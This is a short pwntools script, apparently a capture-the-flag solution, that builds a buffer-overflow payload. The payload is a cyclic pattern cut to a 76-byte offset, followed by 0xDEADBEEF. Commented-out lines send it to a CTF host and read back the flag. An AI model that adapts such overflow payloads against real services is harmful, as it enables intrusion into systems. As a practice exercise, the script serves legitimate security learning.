#!/usr/bin/python3

from pwn import *

# connect = remote('pwn.ctf.ae', 9810)
# print(connect.recvuntil(b'?').decode())

pattern = cyclic(100)
pattern = cyclic(cyclic_find('taaa'))
pattern += p32(0xDEADBEEF)

print(pattern)

# connect.sendline(pattern)

# info(connect.recvuntil(b'}').decode())